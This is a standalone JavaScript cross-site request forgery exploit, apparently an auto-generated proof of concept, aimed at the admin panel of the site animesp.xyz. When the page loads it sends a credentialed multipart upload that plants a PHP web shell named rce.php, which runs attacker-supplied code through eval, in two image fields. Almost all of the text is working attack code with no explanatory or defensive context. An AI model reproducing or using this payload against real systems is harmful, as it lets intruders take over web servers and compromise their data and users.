      function submitRequest()

      {

        var xhr = new XMLHttpRequest();

        xhr.open("POST", "https:\/\/animesp.xyz\/panel\/anime\/store", true);

        xhr.setRequestHeader("Accept", "text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/avif,image\/webp,*\/*;q=0.8");

        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");

        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------21807672722357089691966992198");

        xhr.withCredentials = true;

        var body = "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"main_img\"; filename=\"rce.php\"\r\n" + 

          "Content-Type: application/x-php\r\n" + 

          "\r\n" + 

          "\x3c?php $code = $_GET[\'code\'];\n" + 

          "eval($code); ?\x3e\n" + 

          "\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 

          "\r\n" + 

          "10485760\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"title\"\r\n" + 

          "\r\n" + 

          "TEST-Vuln\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"description\"\r\n" + 

          "\r\n" + 

          "TEST-Vuln\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"year\"\r\n" + 

          "\r\n" + 

          "1980\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"seasons\"\r\n" + 

          "\r\n" + 

          "spring\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"ratings\"\r\n" + 

          "\r\n" + 

          "+13\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"company\"\r\n" + 

          "\r\n" + 

          "TEST-Vuln\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"names[]\"\r\n" + 

          "\r\n" + 

          "TEST-Vuln\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"names[]\"\r\n" + 

          "\r\n" + 

          "TEST-Vuln\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"genres[]\"\r\n" + 

          "\r\n" + 

          "Action\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"genres[]\"\r\n" + 

          "\r\n" + 

          "Adventure\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"myanime_score\"\r\n" + 

          "\r\n" + 

          "8\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"sauce\"\r\n" + 

          "\r\n" + 

          "manga\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"type\"\r\n" + 

          "\r\n" + 

          "series\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"main_genre\"\r\n" + 

          "\r\n" + 

          "Action\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"quality_available[]\"\r\n" + 

          "\r\n" + 

          "480\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"down_link[480]\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"down_link[720]\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"down_link[1080]\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"down_link[1080x256]\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"down_link[720x256]\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"down_link[\xd8\xb2\xdb\x8c\xd8\xb1\xd9\x86\xd9\x88\xdb\x8c\xd8\xb3]\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"bg_img\"; filename=\"rce.php\"\r\n" + 

          "Content-Type: application/x-php\r\n" + 

          "\r\n" + 

          "\x3c?php $code = $_GET[\'code\'];\n" + 

          "eval($code); ?\x3e\n" + 

          "\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n" + 

          "\r\n" + 

          "10485760\r\n" + 

          "-----------------------------21807672722357089691966992198\r\n" + 

          "Content-Disposition: form-data; name=\"trailer_img\"\r\n" + 

          "\r\n" + 

          "https://google.com\r\n" + 

          "-----------------------------21807672722357089691966992198--\r\n";

        var aBody = new Uint8Array(body.length);

        for (var i = 0; i < aBody.length; i++)

          aBody[i] = body.charCodeAt(i); 

        xhr.send(new Blob([aBody]));

      }

      submitRequest();

